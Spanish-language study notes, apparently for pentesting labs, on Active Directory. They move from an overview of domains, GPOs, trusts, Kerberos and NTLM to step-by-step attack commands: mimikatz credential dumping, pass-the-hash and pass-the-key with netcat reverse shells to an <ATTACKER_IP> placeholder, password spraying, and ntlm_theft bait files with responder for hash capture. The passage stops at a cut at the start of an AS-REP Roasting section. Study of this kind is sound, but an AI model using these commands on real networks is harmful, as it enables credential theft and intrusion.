
# Introducción a AD

Imaginar administrar una red de una pequeña empresa con pocos ordenadores y pocos empleados. En ese caso, se puede configurar cada ordenador por separado sin problema (iniciando sesión manual, crear usuarios, realizar configuraciones específicas a cada usuario, etc). Además, si un ordenador deja de funcionar, el empleado irá a ti y lo solucionarás.

Sin embargo, si la empresa crece y pasamos a tener 200 ordenadores y 400 usuarios, además distribuidos en diferentes áreas físicas, es más complejo de administrar de forma manual e independiente.

Por ello, se usa un **dominio de Windows**. Es un grupo de usuarios y ordenadores, bajo la administración de una empresa determinada. La idea es centralizar la administración de los ordenadores, en un único repositorio llamado **directorio activo** (AD - Active directory).

El servidor que ejecuta los servicios de AD se llama **controlador de dominio (DC)**. Es el grupo que suele administrar todos los equipos y recursos de un dominio. Un controlador de dominio es un servidor de Active Directory que actúa como el cerebro de un dominio de servidor Windows, es decir, supervisa toda la red. Dentro del dominio, actúa como guardián de la autenticación de usuarios y la autorización de recursos de TI.

Las principales ventajas de tener un dominio Windows configurado son:

- **Gestión centralizada de identidades:** Todos los usuarios de la red pueden configurarse desde Active Directory con el mínimo esfuerzo.
- **Gestión de políticas de seguridad:** Puede configurar políticas de seguridad directamente desde Active Directory y aplicarlas a los usuarios y equipos de la red según sea necesario.


**Ejemplo:**

En las redes de Universidades, a menudo se le proporcionará un nombre de usuario y una contraseña que puede usar en cualquiera de los ordenadores disponibles en el campus. Sus credenciales son válidas para todas las máquinas, ya que al ingresarlas en una máquina, el proceso de autenticación se reenvía a Active Directory, donde se verifican. Gracias a Active Directory, no es necesario que sus credenciales estén en cada máquina y están disponibles en toda la red.

Active Directory también es el componente que permite a la Universidad restringirle el acceso al panel de control en sus ordenadores. Generalmente, se implementarán políticas en toda la red para que no tenga privilegios administrativos en esos dispositivos.


**Máquinas (ordenadores):**

El nombre de la cuenta de máquina es el nombre del equipo seguido de un signo de dólar. Por ejemplo, una máquina llamada `DC01` tendrá una cuenta de máquina llamada `DC01$`.


**Tipos de grupos:**

| **Grupo de seguridad**           | **Descripción**                                                                                                                                                                                  |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Administradores del Dominio      | Los usuarios de este grupo tienen privilegios administrativos sobre todo el dominio. Por defecto, pueden administrar cualquier equipo del dominio, incluyendo los Controladores de Dominio (DC). |
| Operadores de Servidor           | Los usuarios en este grupo pueden administrar los Controladores de Dominio. No pueden modificar las membresías de otros grupos administrativos.                                                  |
| Operadores de Copia de Seguridad | Los usuarios en este grupo pueden acceder a cualquier archivo, ignorando sus permisos. Se usan para realizar copias de seguridad de datos en los equipos.                                        |
| Operadores de Cuentas            | Los usuarios en este grupo pueden crear o modificar otras cuentas en el dominio.                                                                                                                 |
| Usuarios del Dominio             | Incluye todas las cuentas de usuario existentes en el dominio.                                                                                                                                   |
| Equipos del Dominio              | Incluye todos los equipos existentes en el dominio.                                                                                                                                              |
| Controladores de Dominio         | Incluye todos los Controladores de Dominio existentes en el dominio.                                                                                                                             |

Para configurar usuarios, grupos o máquinas en Active Directory, necesitamos iniciar sesión en el Controlador de Dominio y ejecutar “Usuarios y equipos de Active Directory”.
Esto abrirá una ventana donde podrá ver la jerarquía de usuarios, equipos y grupos que existen en el dominio. Estos objetos están organizados en Unidades Organizativas (OU), que son objetos contenedores que le permiten clasificar usuarios y equipos. Las OU se utilizan principalmente para definir conjuntos de usuarios con requisitos de políticas similares. Es probable que las personas del departamento de Ventas de su organización tengan un conjunto de políticas diferente al de las personas de TI, por ejemplo. Tenga en cuenta que un usuario solo puede formar parte de una única OU a la vez.


**Grupos de seguridad vs. UO**

- Las UO son útiles para aplicar políticas a usuarios y equipos, incluyendo configuraciones específicas para conjuntos de usuarios según su rol en la empresa. Recuerde que un usuario solo puede ser miembro de una UO a la vez, ya que no tendría sentido aplicar dos conjuntos de políticas diferentes a un mismo usuario.
- Los Grupos de Seguridad, por otro lado, se utilizan para otorgar permisos sobre recursos. Por ejemplo, se utilizan grupos para permitir que algunos usuarios accedan a una carpeta compartida o a una impresora de red. Un usuario puede formar parte de varios grupos, lo cual es necesario para otorgar acceso a múltiples recursos.


**Directivas de grupo (GPO):**

Si podemos organizar usuarios y equipos en unidades organizativas (OU), ahora la idea principal es poder implementar diferentes políticas para cada OU individualmente. De esta forma, podemos implementar diferentes configuraciones y valores de referencia de seguridad para los usuarios según su departamento.

Windows administra estas políticas mediante **Objetos de directiva de grupo (GPO)**. Los GPO son simplemente un conjunto de configuraciones que se pueden aplicar a las OU. Los GPO pueden contener políticas dirigidas tanto a usuarios como a equipos, lo que permite establecer un valor de referencia en máquinas e identidades específicas.

Para configurar los GPO, puede usar la herramienta **Administración de directivas de grupo**, disponible en el menú Inicio.

Lo primero que verá al abrirlo es la jerarquía completa de UO. Para configurar las directivas de grupo, primero cree una GPO en **Objetos de directiva de grupo** y luego vincúlela a la UO donde desea que se apliquen las directivas. 

Las GPO se distribuyen a la red mediante un recurso compartido de red llamado `SYSVOL`, que se almacena en el controlador de dominio. Todos los usuarios de un dominio suelen tener acceso a este recurso compartido a través de la red para sincronizar sus GPO periódicamente. El recurso compartido SYSVOL apunta por defecto al directorio `C:\Windows\SYSVOL\sysvol\` en cada controlador de dominio de nuestra red.

Una vez realizado un cambio en cualquier GPO, los equipos pueden tardar hasta dos horas en sincronizarse. Si desea forzar la sincronización inmediata de sus GPO en un equipo específico, puede ejecutar el siguiente comando en el equipo deseado:

```
PS C:\> gpupdate /force
```


**Trees, Forests and Trusts (árboles, bosques y relaciones de confianza)**:

1. Árboles:

Active Directory permite la integración de varios dominios,  lo que permite particionar la red en unidades que se pueden administrar de forma independiente. Si tiene dos dominios que comparten el mismo espacio de nombres (dominio), esos dominios se pueden unir en un árbol.

Por ejemplo, si tenemos un dominio creanyx0.local y se divide en dos subdominios para dos sucursales, podría construirse un árbol con un dominio raíz de creanyx0.local y dos subdominios llamados es.creanyx0.local y en.creanyx0.local, cada uno con su AD, ordenadores y usuarios.

Esta estructura particionada nos brinda un mejor control sobre quién puede acceder a qué en el dominio. El personal de 'es' tendrá su propio DC que administra únicamente sus recursos. Y un usuario de 'es' no podrá administrar los usuarios de 'en'. De esta manera, los administradores de dominio de cada sucursal tendrán control total sobre sus respectivos DC, pero no sobre los de las demás sucursales. Las políticas también se pueden configurar de forma independiente para cada dominio del árbol.

Es necesario introducir un nuevo grupo de seguridad al hablar de árboles y bosques. El grupo **Administradores de la empresa** otorgará a un usuario privilegios administrativos sobre todos los dominios de una empresa. Cada dominio seguirá teniendo sus administradores de dominio con privilegios de administrador sobre sus dominios individuales y los administradores de la empresa, que pueden controlar todo en la empresa.


2. Bosques:

Los dominios que administras también pueden configurarse en diferentes espacios de nombres (dominios). Supongamos que tu empresa continúa creciendo y finalmente adquiere otra llamada `Elisa`. 

Cuando ambas empresas se fusionen, probablemente tendrás diferentes árboles de dominios para cada una, cada uno gestionado por su propio departamento de TI. La unión de varios árboles con diferentes espacios de nombres en la misma red se conoce como `bosque`.


3. Relaciones de confianza:

Tener varios dominios organizados en árboles y bosques te permite tener una red bien compartimentada en términos de administración y recursos. Pero en cierto momento, un usuario de `Elisa` podría necesitar acceder a un archivo compartido en uno de los servidores de 'Creanyx0'. Para que esto suceda, los dominios organizados en árboles y bosques se unen mediante `relaciones de confianza`.

En pocas palabras, tener una relación de confianza entre dominios te permite autorizar a un usuario del dominio `Elisa` a acceder a los recursos del dominio `Creanyx0`.

La relación de confianza más simple que se puede establecer es una `relación de confianza unidireccional`. En una confianza unidireccional, si el "Dominio AAA" confía en el "Dominio BBB", esto significa que un usuario en BBB puede estar autorizado a acceder a los recursos en AAA.

La dirección de la relación de confianza unidireccional es contraria a la dirección de acceso.

También se pueden crear **relaciones de confianza bidireccionales** para que ambos dominios autoricen mutuamente a los usuarios del otro. De forma predeterminada, la unión de varios dominios bajo un árbol o bosque formará una relación de confianza bidireccional.

Es importante tener en cuenta que tener una relación de confianza entre dominios no otorga automáticamente acceso a todos los recursos de otros dominios. Una vez establecida la relación de confianza, se puede autorizar a usuarios en diferentes dominios, pero depende de tú decidas qué se autoriza realmente y qué no.

Las confianzas de AD, clasificadas según sus características, se conocen como confianzas transitivas y no transitivas. La confianza transitiva refleja una relación bidireccional entre dominios. Si hay tres dominios, el dominio A confía en el dominio B y el dominio B tiene una confianza transitiva con el dominio C. En consecuencia, el dominio A confiará automáticamente en el dominio C para compartir recursos.

En resumen, un árbol es un conjunto de dominios. Un bosque es un conjunto de árboles.

Para configurarlo o verlo:

```
Server Manager > Tools > Active Directory Domains and Trust
```



# Métodos de autenticación

Al usar dominios de Windows, todas las credenciales se almacenan en los controladores de dominio. Cada vez que un usuario intenta autenticarse en un servicio con credenciales de dominio, este deberá solicitar al controlador de dominio que verifique si son correctas. 

Se pueden usar dos protocolos para la autenticación de red en dominios de Windows:

- **Kerberos:** Utilizado por cualquier versión reciente de Windows. Este es el protocolo predeterminado en cualquier dominio reciente.
- **NetNTLM:** Protocolo de autenticación heredado que se mantiene por motivos de compatibilidad.


## Kerberos

El usuario envía su nombre de usuario y una marca de tiempo cifrada con una clave derivada de su contraseña al Centro de Distribución de Claves (KDC), un servicio que suele instalarse en el controlador de dominio y que se encarga de crear los tickets Kerberos en la red.

El KDC creará y enviará un Ticket de Concesión de Tickets (TGT), que permitirá al usuario solicitar tickets adicionales para acceder a servicios específicos. La necesidad de un ticket para obtener más tickets puede parecer un poco extraña, pero permite a los usuarios solicitar tickets de servicio sin tener que proporcionar sus credenciales cada vez que desean conectarse a un servicio. Junto con el TGT, se proporciona al usuario una Clave de Sesión, que necesitará para generar las siguientes solicitudes.

Tenga en cuenta que el TGT se cifra con el hash de la contraseña de la cuenta krbtgt, por lo que el usuario no puede acceder a su contenido. Es esencial saber que el TGT cifrado incluye una copia de la clave de sesión como parte de su contenido y el KDC no necesita almacenar la clave de sesión ya que puede recuperar una copia descifrando el TGT si es necesario.

Cuando un usuario desea conectarse a un servicio en la red, como un recurso compartido, un sitio web o una base de datos, usará su TGT para solicitar al KDC un **Servicio de Concesión de Tickets (TGS)**. Los TGS son tickets que permiten la conexión únicamente al servicio específico para el que fueron creados. Para solicitar un TGS, el usuario enviará su nombre de usuario y una marca de tiempo cifrada con la clave de sesión, junto con el TGT y un **Nombre Principal del Servicio (SPN)**, que indica el servicio y el nombre del servidor al que desea acceder.

Como resultado, el KDC nos enviará un TGS junto con una **Clave de Sesión del Servicio**, que necesitaremos para autenticarnos en el servicio al que deseamos acceder. El TGS se cifra con una clave derivada del **Hash del Propietario del Servicio**. El Propietario del Servicio es la cuenta de usuario o máquina bajo la que se ejecuta el servicio. El TGS contiene una copia de la Clave de Sesión del Servicio en su contenido cifrado para que el Propietario del Servicio pueda acceder a él descifrándolo.

El TGS se puede enviar al servicio deseado para autenticarse y establecer una conexión. El servicio utilizará el hash de la contraseña de su cuenta configurada para descifrar el TGS y validar la clave de sesión del servicio.


## NetNTLM

NetNTLM funciona utilizando un mecanismo de desafío-respuesta. El proceso completo es el siguiente:

1. El cliente envía una solicitud de autenticación al servidor al que desea acceder.
2. El servidor genera un número aleatorio y lo envía como un desafío al cliente.
3. El cliente combina el hash de su contraseña NTLM con el desafío (y otros datos conocidos) para generar una respuesta al desafío y la envía de vuelta al servidor para su verificación.
4. El servidor reenvía el desafío y la respuesta al controlador de dominio para su verificación.
5. El controlador de dominio utiliza el desafío para recalcular la respuesta y la compara con la respuesta original enviada por el cliente. Si ambas coinciden, el cliente se autentica; de lo contrario, se deniega el acceso. El resultado de la autenticación se envía de vuelta al servidor.
6. El servidor reenvía el resultado de la autenticación al cliente.

Tenga en cuenta que la contraseña (o hash) del usuario nunca se transmite a través de la red por motivos de seguridad.

**Nota:** El proceso descrito se aplica al usar una cuenta de dominio. Si se utiliza una cuenta local, el servidor puede verificar la respuesta al desafío por sí mismo sin requerir interacción con el controlador de dominio, ya que tiene el hash de la contraseña almacenado localmente en su SAM.

# Métodos alternativos de autenticación con contraseña
## Pass-the-Hash - NTLM

Como resultado de extraer credenciales de un host en el que hemos obtenido privilegios administrativos (utilizando mimikatz o herramientas similares), es posible que obtengamos contraseñas en texto plano o hash que se pueden descifrar fácilmente. Sin embargo, si no tenemos suerte, terminaremos con hash de contraseñas NTLM sin descifrar.

Aunque pueda parecer que no podemos utilizar esos hash, el desafío NTLM enviado durante la autenticación puede responderse con solo conocer el hash de la contraseña. Esto significa que podemos autenticarnos sin necesidad de conocer la contraseña en texto plano. En lugar de tener que descifrar los hash NTLM, si el dominio de Windows está configurado para utilizar la autenticación NTLM, podemos utilizar **Pass-the-Hash** (PtH) y autenticarnos correctamente.

Para extraer los hash NTLM, podemos utilizar **mimikatz para leer el SAM local o extraer los hash directamente de la memoria LSASS**.

1. **Extracción de hash NTLM del SAM local:**
Este método solo le permitirá obtener hash de los usuarios locales del equipo. No estarán disponibles los hash de los usuarios del dominio.

```shell-session
powershell>
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam   
```

2. **Extracción de hash NTLM de la memoria LSASS:**
Este método le permitirá extraer cualquier hash NTLM de usuarios locales y de cualquier usuario de dominio que haya iniciado sesión recientemente en el equipo.

```shell-session
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv 
```

A continuación, podemos utilizar los hash extraídos para realizar un ataque PtH utilizando mimikatz para inyectar un token de acceso para el usuario víctima en un shell inverso (o cualquier otro comando que desee) de la siguiente manera:

```shell-session
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:<nombreUsuario> /domain:<dominio> /ntlm:<hash> /run:"c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> <puerto>"
```

Observe que hemos utilizado «token::revert» para restablecer nuestros privilegios de token originales, ya que intentar pasar el hash con un token elevado no funcionará.

Esto sería equivalente a utilizar **«runas /netonly»**, pero con un hash en lugar de una contraseña, y generará un nuevo shell inverso desde el que podremos ejecutar cualquier comando como usuario víctima.

Para recibir el shell inverso, debemos ejecutar un listener inverso en nuestro AttackBox:

```shell-session
user@AttackBox$ nc -lvp <puerto>
```

Curiosamente, si ejecutas el comando whoami en este shell, seguirá mostrándote el usuario original que estabas utilizando antes de realizar PtH, pero cualquier comando que se ejecute desde aquí utilizará en realidad las credenciales que inyectamos mediante PtH.

3. **Pass the Hash usando Linux:**

Si tienes acceso a un equipo Linux (como tu AttackBox), hay varias herramientas que incorporan soporte para realizar PtH utilizando diferentes protocolos. Dependiendo de los servicios que tengas disponibles, puedes hacer lo siguiente:

_Conectarse a RDP utilizando PtH:_

```shell-session
xfreerdp /v:<VICTIM_IP> /u:<DOMAIN\\MyUser> /pth:<NTLM_HASH>
```

_Conectarse vía psexec usando PtH:_

```shell-session
psexec.py -hashes <NTLM_HASH> <DOMAIN/MyUser>@<VICTIM_IP>
```

_Conectarse vía WinRM usando PtH:_

```shell-session
evil-winrm -i <VICTIM_IP> -u <MyUser> -H <NTLM_HASH>
```


## Pass-the-Ticket - Kerberos

En ocasiones, será posible extraer **tickets Kerberos y claves de sesión de la memoria LSASS utilizando mimikatz**. 

El proceso suele requerir que tengamos privilegios de SISTEMA en la máquina atacada y se puede realizar de la siguiente manera:

```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Tenga en cuenta que si solo tuviéramos acceso a un ticket pero no a su clave de sesión correspondiente, no podríamos utilizar ese ticket. Por lo tanto, ambos son necesarios.

Aunque mimikatz puede extraer cualquier TGT o TGS disponible de la memoria del proceso LSASS, la mayoría de las veces nos interesarán los TGT, ya que pueden utilizarse para solicitar acceso a cualquier servicio al que el usuario tenga permiso para acceder. Al mismo tiempo, los TGS solo sirven para un servicio específico. Para extraer TGT, necesitaremos las credenciales del administrador, mientras que para extraer TGS basta con una cuenta con privilegios bajos (solo los asignados a esa cuenta).

Una vez que hayamos extraído el ticket deseado, podemos inyectar los tickets en la sesión actual con el siguiente comando:

```shell-session
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-<dominio>
```

La inyección de tickets en nuestra propia sesión no requiere privilegios de administrador. Después de esto, los tickets estarán disponibles para cualquier herramienta que utilicemos para el movimiento lateral. Para comprobar si los tickets se han inyectado correctamente, puede utilizar el comando klist:

```shell-session
C:\> klist
```

  
## Overpass-the-hash / Pass-the-Key

Este tipo de ataque es similar al PtH, pero se aplica a redes Kerberos.

Cuando un usuario solicita un TGT, envía una marca de tiempo cifrada con una clave de cifrado derivada de su contraseña. El algoritmo utilizado para derivar esta clave puede ser DES (desactivado por defecto en las versiones actuales de Windows), RC4, AES128 o AES256, dependiendo de la versión de Windows instalada y de la configuración de Kerberos. Si disponemos de alguna de esas claves, podemos solicitar al KDC un TGT sin necesidad de la contraseña real, de ahí el nombre **Pass-the-key (PtK)**.

Podemos obtener las claves de cifrado Kerberos de la memoria utilizando mimikatz con los siguientes comandos:

```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Dependiendo de las claves disponibles, podemos ejecutar los siguientes comandos en mimikatz para obtener un shell inverso a través de Pass-the-Key:

**RC4 hash:**

```shell-session
mimikatz # sekurlsa::pth /user:<user> /domain:<dominio> /rc4:<hash> /run:"c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> <puerto>"
```

**AES128 hash:**

```shell-session
mimikatz # sekurlsa::pth /user:<user> /domain:<dominio> /aes128:<hash> /run:"c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> <puerto>"
```

**AES256 hash:**

```shell-session
mimikatz # sekurlsa::pth /user:<user> /domain:<dominio> /aes256:<hash> /run:"c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> <puerto>"
```

Tenga en cuenta que, al utilizar RC4, la clave será igual al hash NTLM de un usuario. Esto significa que, si pudiéramos extraer el hash NTLM, podríamos utilizarlo para solicitar un TGT siempre que RC4 sea uno de los protocolos habilitados. Esta variante concreta se conoce normalmente como **Overpass-the-Hash (OPtH)**.

Para recibir la reverse shell, hay que abrir un reverse listener en la máquina atacante:

```shell-session
user@AttackBox$ nc -lvp <puerto>
```

Al igual que con PtH, cualquier comando ejecutado desde este shell utilizará las credenciales inyectadas a través de mimikatz.



# Interpretación de información

Cuando vemos algo como:

```
dominio.local\nombreUser
```

La parte de la izquierda es el dominio y lo de la derecha es el usuario.



# Enumeración

1. **Enumeración de usuarios**
	Ej: Bloodhound

Enumeración a través del símbolo del sistema (CMD):

Podemos usar el comando `net` para listar todos los usuarios del dominio AD mediante la subopción `user`:

```
cmd> net user /domain
```

Esto nos mostrará todos los usuarios de AD y puede ser útil para determinar el tamaño del dominio para preparar futuros ataques. También podemos usar esta subopción para enumerar información más detallada sobre una sola cuenta de usuario:

```
cmd> net user <usuario> /domain
```

Enumeración a través de Powershell:

Podemos usar el cmdlet `Get-ADUser` para enumerar los usuarios de AD:

```
PS> Get-ADUser -Identity <user> -Server <servidor> -Properties * 
```

- Identidad: El nombre de la cuenta que estamos enumerando.
- Propiedades: Qué propiedades asociadas con la cuenta se mostrarán, * mostrará todas las propiedades.
- Servidor: Como no estamos unidos a un dominio, debemos usar este parámetro para apuntar a nuestro controlador de dominio.


Enumeración con kerbrute:

Descargar la herramienta: https://github.com/ropnop/kerbrute/releases
Darle permisos de ejecución.
Descargar wordlist o crear uno: https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt


Busca usuarios con esa lista:

```
./kerbrute userenum --dc <dc> -d <dominio> <wordlist>
```

```
./kerbrute userenum -dc-ip <IP> -d <dominio> <wordlist>
```

Si sale alguno con (no preauth), usar

```
impacket-GetNPUsers <dominio>/<user> -no-pass
```

Si conseguimos hash y romperlo con john, podemos intentar enumerar los usuarios del dominio:

```
rpcclient -U <user%contraseña> <IP>
rcclient $> enumdomusers
```

O con ldapdomaindump:

```
ldapdomaindump -u '<dominio>\<usuario>' -p 'pass' <IP>
```

Una vez tienes creds, bloodhound.


2. **Enumeración de grupos**

Enumeración a través del símbolo del sistema (CMD):

Podemos utilizar el comando `net` para enumerar los grupos del dominio utilizando la subopción `group`:

```
cmd> net group /domain
```

Esta información puede ayudarnos a encontrar grupos específicos para la ejecución de objetivos. También podríamos enumerar más detalles, como la pertenencia a un grupo, especificando el grupo en el mismo comando:

```
cmd> net group "<nombreGrupo>" /domain
```

Enumeración a través de Powershell:

```
PS> Get-ADGroup -Identity <grupo> -Server <servidor>
```

```
PS> Get-ADGroupMember -Identity <grupo> -Server <servidor>
```



3. **Políticas de contraseñas**

Enumeración a través del símbolo del sistema (CMD):

Podemos usar el comando `net` para enumerar la política de contraseñas del dominio usando la subopción `accounts`:

```
cmd> net accounts /domain
```

Esta información puede sernos útil si queremos realizar ataques adicionales de 'password spraying' contra las demás cuentas de usuario que hemos enumerado. Nos ayuda a predecir mejor qué contraseñas usar en el ataque y cuántos ataques podemos ejecutar antes de arriesgarnos a bloquear las cuentas. Sin embargo, cabe destacar que si realizamos un ataque de este tipo a ciegas, podríamos bloquear las cuentas de todos modos, ya que no verificamos cuántos intentos le quedaban a esa cuenta antes de ser bloqueada.

Antes de iniciar un ataque de contraseñas, es fundamental comprender la política de contraseñas de nuestro objetivo. Esto nos permitirá obtener información sobre la longitud mínima de la contraseña, su complejidad y el número de intentos fallidos que bloquean una cuenta.

**rpcclient**: Podemos utilizar rpcclient a través de una sesión nula para consultar al DC la política de contraseñas:

`rpcclient -U "" <IP> -N`


A continuación, podemos ejecutar el comando `getdompwinfo`:

```shell-session
rpcclient $> getdompwinfo
min_password_length: 12
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
```


**CrackMapExec**: Nos permite realizar enumeraciones, ejecutar comandos y llevar a cabo ataques posteriores a la explotación en entornos Windows. Es compatible con varios protocolos de red, como SMB, LDAP, RDP y SSH. Si se permite el acceso anónimo, podemos recuperar la política de contraseñas sin credenciales con el siguiente comando:

```shell-session
user@t$ crackmapexec smb <IP> --pass-pol
```



4. **Enumerar objetos de AD:**

Se puede realizar una búsqueda más genérica de cualquier objeto de AD mediante el cmdlet `Get-ADObject`. Por ejemplo, si buscamos todos los objetos de AD modificados después de una fecha específica:

```
PS> $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)

PS> Get-ADObject -Filter 'whenChanged' -gt $ChangeDate -includeDeletedObjects -Server <servidor>
```

Si quisiéramos, por ejemplo, realizar un **ataque de 'password spraying' sin bloquear cuentas**, podemos usar esto para enumerar cuentas que tengan un badPwdCount mayor que 0, para evitar estas cuentas en nuestro ataque:

```
PS> Get-ADObject -Filter 'badPwnCount -gt 0' -Server <servidor> 
```


5. **Enumerar el AD:**

**Bloodhound** permitía a los atacantes (y ahora también a los defensores) visualizar el entorno de AD en un formato gráfico con nodos interconectados. Cada conexión representa una ruta posible que podría explotarse para alcanzar un objetivo. Por el contrario, los defensores usaban listas, como una lista de administradores de dominio o una lista de todos los hosts del entorno.

**Sharphound**: A menudo se oye a los usuarios referirse a Sharphound y Bloodhound indistintamente. Sin embargo, no son lo mismo. Sharphound es la herramienta de enumeración de Bloodhound. Se utiliza para enumerar la información del AD que luego se puede visualizar en Bloodhound. Bloodhound es la interfaz gráfica de usuario (GUI) utilizada para mostrar los gráficos de ataque del AD. Por lo tanto, primero debemos aprender a usar Sharphound para enumerar el AD antes de poder visualizar los resultados con Bloodhound.

Existen tres recopiladores de Sharphound diferentes:

- **Sharphound.ps1** - Script de PowerShell para ejecutar Sharphound. Sin embargo, la última versión de Sharphound ha dejado de publicar la versión del script de PowerShell. Esta versión es ideal para usar con RAT, ya que el script se puede cargar directamente en memoria, evitando los análisis de antivirus en disco.
- **Sharphound.exe** - Una versión ejecutable de Windows para ejecutar Sharphound.
- **AzureHound.ps1** - Script de PowerShell para ejecutar Sharphound en instancias de Azure (Microsoft Cloud Computing Services). Bloodhound puede ingerir datos enumerados de Azure para encontrar rutas de ataque relacionadas con la configuración de Azure Identity and Access Management.

Ejecutaremos Sharphound de la siguiente manera:

`Sharphound.exe --CollectionMethods <Methods> --Domain <dominio> --ExcludeDCs`

- CollectionMethods: Determina el tipo de datos que Sharphound recopilará. Las opciones más comunes son "Predeterminado" o "Todo". Además, dado que Sharphound almacena la información en caché, una vez completada la primera ejecución, solo se puede usar el método de recopilación "Sesión" para recuperar nuevas sesiones de usuario y así acelerar el proceso.
- Dominio: Aquí especificamos el dominio que queremos enumerar. En algunos casos, es posible que desee enumerar un dominio principal u otro dominio que tenga confianza con su dominio existente. Puede indicar a Sharphound qué dominio debe enumerarse modificando este parámetro.
- ExcludeDCs: Esto indicará a Sharphound que no toque los controladores de dominio, lo que reduce la probabilidad de que la ejecución de Sharphound genere una alerta.


**Pentesting LDAP:** Cualquier par de credenciales de AD válido debe poder vincularse a la interfaz LDAP de un controlador de dominio. Esto permitirá escribir consultas de búsqueda LDAP para enumerar información sobre los objetos de AD en el dominio.
https://book.hacktricks.xyz/pentesting/pentesting-ldap


**PowerView:**  scripts como PowerView pueden ser increíblemente útiles para realizar enumeraciones semimanuales de objetos de AD.
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
Es del proyecto: https://github.com/PowerShellMafia/PowerSploit


**WMI:** WMI puede usarse para enumerar información de hosts de Windows. Cuenta con un proveedor llamado "root\directory\ldap" que permite interactuar con AD. Podemos usar este proveedor y WMI en PowerShell para realizar la enumeración de AD.
https://0xinfection.github.io/posts/wmi-ad-enum/



6. **Enumeración de dominio**

Podemos usar `Get-ADDomain` para recuperar información adicional sobre el dominio específico:

```
PS> Get-ADDomain -Server <dominio>
```


6. **Puertos abiertos**
	nmap (al ser AD suele tener el 53, kerberos, ldap...)

7. **Nombre del dominio**
	nmap
	IMPORTANTE: Para lanzar herramientas, primero hay que añadir el nombre del dominio al fichero **/etc/hosts**.

![[Pasted image 20250805181138.png]]






# Puerto 445

Abierto el puerto 445, smb en Windows. Es de recursos compartidos (información, enumerar cosas, etc.)

Enumerar nombre dominio:

```
crackmapexec smb <IP>
```

Enumerar recursos compartidos sin saber credenciales:

```
crackmapexec smb <IP> -u '' -p '' --shares
```

```
crackmapexec smb <IP> -u 'anonymous' -p '' --shares
```

```
smbclient -L <victim_IP> -N
```

Para enumerar con más información:

```
smbmap -H <victim-IP> -u ''
```

Probar a enumerar algún recurso compartido sin ningún usuario y con contraseña en blanco:

```
smbclient -U <cualquierString> \\\\<victim_IP>\\<recursoCompartido>
```

O también:

```
smbmap -H <IP> -r <recursoCompartido>
```

Si no se puede listar con smbclient o smbmap, podemos usar otra para enumerar el AD:

```
enum4linux -a <IP>
```

Intentar enumerar como guest, si está habilitado:

```
enum4linux -u <dominio>\\guest -a <IP>
```

A veces puede dar usuarios si está mal configurada, y si es así podemos hacer el ataque de ASREProast.

Enumerar si tenemos credenciales:

```
enum4linux -u <dominio>\\<usuario> -p <contraseña> -a <IP>
```

A veces está habilitado LDAP como anónimo y conseguir una lista de usuarios, grupos, etc.:

```
ldapsearch -x -H ldap://<IP> -b "dc=thm,dc=local" > thm_enum.txt
```

Y hacer password spraying:

```
crackmapexec smb <IP> -u /home/kali/Downloads/thm_usernames.txt -p <contraseña>
```

Para descargar un fichero del recurso compartido y analizarlo en local:

```
smbmap -H <IP> --download <recursoCompartidoFicheroADescargar>
```

A veces, dentro del fichero hay contraseñas, pero están cifradas:

```
Policies/{rec}/_Machine/Preferences/Groups/groups.xml
```

Para descifrarlas:

```
gpp-decrypt "<contraseña>"
```

Si ves que un usuario accede a un recurso compartido SMB (por ejemplo porque ves que van cambiando nombres o van apareciendo ficheros, etc), puedes usar una herramienta para capturar el hash NTLM de una víctima para crackearlo.

En concreto, la herramienta se llama ntlm_theft y genera archivos diseñados para provocar que Windows envíe credenciales automáticamente.

Cuando un usuario abre un archivo .url o .scf o similar que apunte a un recurso ej "\\servidor\recurso" Windows intenta autenticarse automáticamente con NTLM para acceder. Entonces si creas un archivo señuelo que tiene una referencia (creando un .url malicioso), cuando la víctima abre esa carpeta o archivo, su sistema contacta con tu servidor para descargar lo que cree que es legítimo. Al hacerlo, Windows envía automáticamente un challenge/response NTML con  el hash de la cuenta del usuario sin que éste escriba su contraseña.

Entonces si el atacante captura el hash porque está ejecutando algo como responder o impacket-smbserver, puede intentar crackearlo offline con hashcat o john.

Como conclusión, ntlm_theft es una herramienta que genera esos archivos maliciosos que apuntan al servidor malicioso. Luego debes subir el .url malicioso al share (recurso compartido) donde la víctima navega. La víctima abre la carpeta, Windows procesa el .url e intenta acceder. Tu servidor SMB recibe la conexión y captura el hash, para intentar crackearlo.

Herramienta: https://github.com/Greenwolf/ntlm_theft

Atacante crea fichero malicioso:

```
python3 ntlm_theft.py -g url -s <IP-atacante> -f <nombreResultante>
```

-g es el tipo de fichero que se va a generar.

Atacante pone a la escucha:

```
sudo responder -I <interfazRed>
```

Acceder al SMB de la víctima y subir archivo generado:

```
smb: > put "fichero.url"
```

Después de un tiempo esperando en responder, se obtiene el hash.

Intentar crackearlo:

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Si se consigue, intentar obtener shell con evil-winrm:

```
evil-winrm -i <dominio> -u '<user>' -p '<pass>'
```

Si tenemos credenciales, también podemos intentar enumerar el AD con Bloodhound.

Si subimos los datos a Bloodhound y vemos que hay usuarios con AS-REP Roastable, intentamos obtener su hash:

```
GetNPUsers.py -request -format john -no-pass <dominio>/<user>
```

Y ahora con john intentamos crackearlo.


# Acceso a RDP

Con credenciales:

```
xfreerdp /v:<IP> /u:<usuario> /p:<contraseña> /dynamic-resolution
```

Pass the hash:

```
xfreerdp /v:<IP> /u:<user> /pth:<hash>
```

Otra herramienta:

```
rdesktop <IP> -u <usuario> -p <password>
```



# Ataques a AD


1. **Ataque de AS-REP Roasting (ASREProast)**

Consiste en obtener el hash de algún usuario que no requiera autenticación de Kerberos.

